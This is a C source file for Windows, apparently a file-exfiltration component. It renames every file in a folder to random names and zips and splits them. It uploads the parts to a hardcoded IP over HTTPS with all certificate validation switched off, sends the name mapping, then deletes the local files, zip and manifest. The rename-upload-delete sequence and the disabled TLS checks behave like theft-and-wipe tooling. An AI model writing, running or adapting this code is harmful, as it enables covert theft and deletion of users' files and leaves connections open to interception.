﻿// ======================================================
// HTTPS File Uploader (WinHTTP 기반)
// 원본 구조 유지 / HTTP → HTTPS 전환 완료 버전
// ======================================================

#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0600

#include <windows.h>
#include <winhttp.h>        // ★ HTTPS 핵심
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <io.h>

#include "miniz.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")

#define MAX_FILES       1024
#define MAX_PATH_LEN    260
#define PART_SIZE       (512 * 1024)
#define SERVER_IP       "192.168.30.129"
#define SERVER_PORT     8000

typedef struct {
    char original[MAX_PATH_LEN];
    char obfuscated[MAX_PATH_LEN];
} FILE_MAP;

static FILE_MAP file_maps[MAX_FILES];
static int file_count = 0;

static char manifest_path[MAX_PATH_LEN];

// =============================================================
// 🔐 WinHTTP 공통 함수
// =============================================================

static char* https_read_body(HINTERNET hRequest)
{
    char* buffer = NULL;
    DWORD size = 0;
    DWORD downloaded = 0;
    int total = 0;

    for (;;)
    {
        if (!WinHttpQueryDataAvailable(hRequest, &size))
            break;
        if (size == 0)
            break;

        char* temp = (char*)realloc(buffer, total + size + 1);
        if (!temp)
        {
            if (buffer) free(buffer);
            return NULL;
        }
        buffer = temp;

        if (!WinHttpReadData(hRequest, buffer + total, size, &downloaded))
        {
            if (buffer) free(buffer);
            return NULL;
        }

        total += downloaded;
        buffer[total] = 0;
    }

    return buffer;
}


static HINTERNET https_open_request(const wchar_t* method,
    const char* path,
    HINTERNET* pSession,
    HINTERNET* pConnect)
{
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    wchar_t whost[128];
    wchar_t wpath[512];
    DWORD flags;

    *pSession = NULL;
    *pConnect = NULL;

    hSession = WinHttpOpen(L"UploaderHTTPS/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession)
        goto fail;

    MultiByteToWideChar(CP_UTF8, 0, SERVER_IP, -1, whost, 128);

    hConnect = WinHttpConnect(hSession, whost, SERVER_PORT, 0);
    if (!hConnect)
        goto fail;

    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 512);

    hRequest = WinHttpOpenRequest(
        hConnect,
        method,
        wpath,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    if (!hRequest)
        goto fail;

    // 자체 서명 인증서 무시
    flags =
        SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    *pSession = hSession;
    *pConnect = hConnect;
    return hRequest;

fail:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return NULL;
}


static char* https_get(const char* path)
{
    HINTERNET s = NULL, c = NULL, r = NULL;
    char* body = NULL;

    r = https_open_request(L"GET", path, &s, &c);
    if (!r)
        goto cleanup;

    if (!WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0))
        goto cleanup;

    if (!WinHttpReceiveResponse(r, NULL))
        goto cleanup;

    body = https_read_body(r);

cleanup:
    if (r) WinHttpCloseHandle(r);
    if (c) WinHttpCloseHandle(c);
    if (s) WinHttpCloseHandle(s);

    return body;
}


static char* https_post(const char* path,
    const char* headers_ascii,
    const void* body,
    int body_len)
{
    HINTERNET s = NULL, c = NULL, r = NULL;
    wchar_t* wheaders = NULL;
    int wheader_len = 0;
    char* resp = NULL;

    r = https_open_request(L"POST", path, &s, &c);
    if (!r)
        goto cleanup;

    if (headers_ascii && headers_ascii[0])
    {
        int len = (int)strlen(headers_ascii);
        wheader_len = MultiByteToWideChar(CP_UTF8, 0, headers_ascii, len, NULL, 0);
        wheaders = (wchar_t*)malloc((wheader_len + 1) * sizeof(wchar_t));
        MultiByteToWideChar(CP_UTF8, 0, headers_ascii, len, wheaders, wheader_len);
        wheaders[wheader_len] = 0;
    }

    if (!WinHttpSendRequest(r,
        wheaders ? wheaders : WINHTTP_NO_ADDITIONAL_HEADERS,
        wheaders ? -1L : 0,
        (LPVOID)body,
        body_len,
        body_len,
        0))
        goto cleanup;

    if (!WinHttpReceiveResponse(r, NULL))
        goto cleanup;

    resp = https_read_body(r);

cleanup:
    if (wheaders) free(wheaders);
    if (r) WinHttpCloseHandle(r);
    if (c) WinHttpCloseHandle(c);
    if (s) WinHttpCloseHandle(s);
    return resp;
}



// =============================================================
// 📑 basename 함수
// =============================================================

static char* basename_nopath(const char* p)
{
    const char* s = strrchr(p, '\\');
    return s ? (char*)(s + 1) : (char*)p;
}


// =============================================================
// 📑 manifest 저장 / 로드
// =============================================================

static int save_manifest()
{
    int i;
    FILE* fp = fopen(manifest_path, "w");
    if (!fp)
        return 0;

    fprintf(fp, "{\n  \"count\": %d,\n  \"files\": [\n", file_count);

    for (i = 0; i < file_count; i++)
    {
        fprintf(fp,
            "    {\"original\": \"%s\", \"obfuscated\": \"%s\"}%s\n",
            file_maps[i].original,
            file_maps[i].obfuscated,
            (i == file_count - 1 ? "" : ","));
    }

    fprintf(fp, "  ]\n}\n");
    fclose(fp);
    return 1;
}


static int load_manifest()
{
    FILE* fp;
    char buf[16384];
    char* p;
    char* q;

    if (_access(manifest_path, 0) != 0)
        return 0;

    fp = fopen(manifest_path, "r");
    if (!fp)
        return 0;

    memset(buf, 0, sizeof(buf));
    fread(buf, 1, sizeof(buf) - 1, fp);
    fclose(fp);

    p = strstr(buf, "\"count\"");
    if (!p) return 0;

    file_count = atoi(strchr(p, ':') + 1);
    if (file_count <= 0 || file_count > MAX_FILES)
        return 0;

    p = strstr(buf, "\"files\"");
    if (!p)
        return 0;

    q = strchr(p, '[');
    if (!q)
        return 0;
    q++;

    {
        int i;
        for (i = 0; i < file_count; i++)
        {
            char* o = strstr(q, "\"original\"");
            char* b = strstr(q, "\"obfuscated\"");
            if (!o || !b)
                return 0;

            sscanf(strchr(o, ':') + 1, " \"%[^\"]\"", file_maps[i].original);
            sscanf(strchr(b, ':') + 1, " \"%[^\"]\"", file_maps[i].obfuscated);

            q = b + 20;
        }
    }

    return 1;
}


// =============================================================
// 🧩 폴더 스캔 + 난독화
// =============================================================

static void scan_and_obfuscate(const char* folder)
{
    WIN32_FIND_DATAA fd;
    char search[MAX_PATH_LEN];
    HANDLE h;

    sprintf(search, "%s\\*.*", folder);

    h = FindFirstFileA(search, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return;

    srand((unsigned)time(NULL));

    do
    {
        char oldpath[MAX_PATH_LEN];
        char newpath[MAX_PATH_LEN];
        char newname[MAX_PATH_LEN];

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        sprintf(oldpath, "%s\\%s", folder, fd.cFileName);

        sprintf(newname, "%u_%u.dat", rand(), rand());
        sprintf(newpath, "%s\\%s", folder, newname);

        MoveFileA(oldpath, newpath);

        strcpy(file_maps[file_count].original, fd.cFileName);
        strcpy(file_maps[file_count].obfuscated, newname);
        file_count++;

    } while (FindNextFileA(h, &fd));

    FindClose(h);
}


// =============================================================
// 🗜 ZIP 생성
// =============================================================

static int make_zip(const char* folder, const char* zipname)
{
    mz_zip_archive zip;
    int i;

    memset(&zip, 0, sizeof(zip));

    if (!mz_zip_writer_init_file(&zip, zipname, 0))
        return 0;

    for (i = 0; i < file_count; i++)
    {
        char full[MAX_PATH_LEN];
        int ok = 0;
        int retry;

        sprintf(full, "%s\\%s", folder, file_maps[i].obfuscated);

        for (retry = 0; retry < 5; retry++)
        {
            ok = mz_zip_writer_add_file(
                &zip,
                file_maps[i].obfuscated,
                full,
                NULL, 0,
                MZ_BEST_COMPRESSION);

            if (ok)
                break;

            Sleep(1500);
        }

        if (!ok)
        {
            printf("[ERROR] ZIP 파일 추가 실패: %s\n", full);
            mz_zip_writer_end(&zip);
            return 0;
        }
    }

    mz_zip_writer_finalize_archive(&zip);
    mz_zip_writer_end(&zip);

    return 1;
}


// =============================================================
// 📦 ZIP 분할
// =============================================================

static int split_zip(const char* zipname, int part_size)
{
    unsigned char* buf;
    FILE* fp;
    int idx = 0;

    fp = fopen(zipname, "rb");
    if (!fp)
        return -1;

    buf = (unsigned char*)malloc(part_size);
    if (!buf)
    {
        fclose(fp);
        return -1;
    }

    for (;;)
    {
        size_t r = fread(buf, 1, part_size, fp);
        if (r == 0)
            break;

        {
            char out[MAX_PATH_LEN];
            FILE* outfp;

            sprintf(out, "%s.part%d", zipname, idx);

            outfp = fopen(out, "wb");
            fwrite(buf, 1, r, outfp);
            fclose(outfp);

            idx++;
        }
    }

    free(buf);
    fclose(fp);
    return idx;
}


// =============================================================
// 🔁 이어받기: 서버에 업로드된 사이즈 체크
// =============================================================

static long server_check_part(const char* filename)
{
    char path[256];
    char* resp;
    char* p;
    long v;

    sprintf(path, "/api/check_part?filename=%s", filename);

    resp = https_get(path);
    if (!resp)
        return 0;

    p = strstr(resp, "\"uploaded_size\":");
    if (!p)
    {
        free(resp);
        return 0;
    }

    v = atol(p + strlen("\"uploaded_size\":"));
    free(resp);
    return v;
}


// =============================================================
// 🔂 part 업로드 (HTTPS)
// =============================================================

static int upload_part_resume(const char* filepath)
{
    FILE* fp;
    char* fname;
    long offset;
    long total;
    long remain;
    char* buf;
    char header[512];
    char* resp;

    fname = basename_nopath(filepath);
    offset = server_check_part(fname);

    fp = fopen(filepath, "rb");
    if (!fp)
        return 0;

    fseek(fp, 0, SEEK_END);
    total = ftell(fp);
    fseek(fp, offset, SEEK_SET);

    remain = total - offset;
    if (remain <= 0)
    {
        fclose(fp);
        return 1;
    }

    buf = (char*)malloc(remain);
    fread(buf, 1, remain, fp);
    fclose(fp);

    sprintf(header,
        "Content-Type: application/octet-stream\r\n"
        "X-Filename: %s\r\n"
        "X-Offset: %ld\r\n",
        fname, offset);

    resp = https_post("/api/upload_part", header,
        buf, (int)remain);

    free(buf);
    if (resp) free(resp);

    return 1;
}


// =============================================================
// 🧾 mapping.json 전송 (HTTPS)
// =============================================================

static int send_mapping_json()
{
    char json[4096];
    int i;
    char* resp;

    json[0] = 0;
    strcat(json, "{");

    for (i = 0; i < file_count; i++)
    {
        char line[512];
        sprintf(line,
            "\"%s\":\"%s\"%s",
            file_maps[i].obfuscated,
            file_maps[i].original,
            (i == file_count - 1 ? "" : ","));
        strcat(json, line);
    }

    strcat(json, "}");

    resp = https_post("/api/mapping",
        "Content-Type: application/json\r\n",
        json,
        (int)strlen(json));

    if (resp) free(resp);

    return 1;
}


// =============================================================
// 🏁 finish_upload (HTTPS)
// =============================================================

static int finish_upload_request(const char* zip_basename, int part_count)
{
    char body[256];
    char* resp;

    sprintf(body, "zip_name=%s&part_count=%d", zip_basename, part_count);

    resp = https_post("/api/finish_upload",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        body,
        (int)strlen(body));

    if (resp) free(resp);

    return 1;
}


// =============================================================
// 🧹 Cleanup
// =============================================================

static void delete_local_file(const char* path)
{
    if (_access(path, 0) == 0)
        remove(path);
}


static void delete_obfuscated_files(const char* folder)
{
    int i;
    char full[MAX_PATH_LEN];
    for (i = 0; i < file_count; i++)
    {
        sprintf(full, "%s\\%s", folder, file_maps[i].obfuscated);
        delete_local_file(full);
    }
}


static void delete_zip_and_parts(const char* folder,
    const char* zipname,
    int part_count)
{
    int i;
    char full[MAX_PATH_LEN];

    sprintf(full, "%s\\%s", folder, zipname);
    delete_local_file(full);

    for (i = 0; i < part_count; i++)
    {
        sprintf(full, "%s\\%s.part%d", folder, zipname, i);
        delete_local_file(full);
    }
}


// =============================================================
// 🚀 전체 업로드
// =============================================================

int run_file_upload(int e_flag)
{
    const char* folder = "C:\\test\\";
    char zip_path[MAX_PATH_LEN];
    int parts;

    if ((e_flag == 2) || (e_flag == 1))
    {
        sprintf(manifest_path, "%s\\upload_manifest.json", folder);

        printf("[UPLOAD] 시작\n");

        if (load_manifest())
        {
            printf("[RESUME] manifest 로드 → 이어받기 모드\n");
        }
        else
        {
            printf("[SCAN] 폴더 스캔 + 난독화\n");
            scan_and_obfuscate(folder);

            printf("[SAVE] manifest 저장\n");
            save_manifest();
        }

        sprintf(zip_path, "%s\\upload.zip", folder);

        printf("[ZIP] ZIP 생성\n");
        if (!make_zip(folder, zip_path))
        {
            printf("[ERROR] ZIP 생성 실패 → 업로드 중단\n");
            return 0;
        }

        printf("[SPLIT] ZIP 분할\n");
        parts = split_zip(zip_path, PART_SIZE);

        printf("[UPLOAD] part 업로드 시작\n");
        {
            int i;
            for (i = 0; i < parts; i++)
            {
                char partpath[MAX_PATH_LEN];
                sprintf(partpath, "%s.part%d", zip_path, i);
                upload_part_resume(partpath);
            }
        }

        printf("[MAPPING] mapping.json 전송\n");
        send_mapping_json();

        printf("[FINISH] finish_upload 호출\n");
        finish_upload_request(basename_nopath(zip_path), parts);

        printf("[CLEANUP] 임시 파일 삭제\n");
        delete_obfuscated_files(folder);
        delete_zip_and_parts(folder, "upload.zip", parts);
        delete_local_file(manifest_path);

        printf("[DONE] 업로드 완료\n");

        if (e_flag == 1 || e_flag == 0)
            return 1;

        Sleep(10000);
    }

    return 1;
}
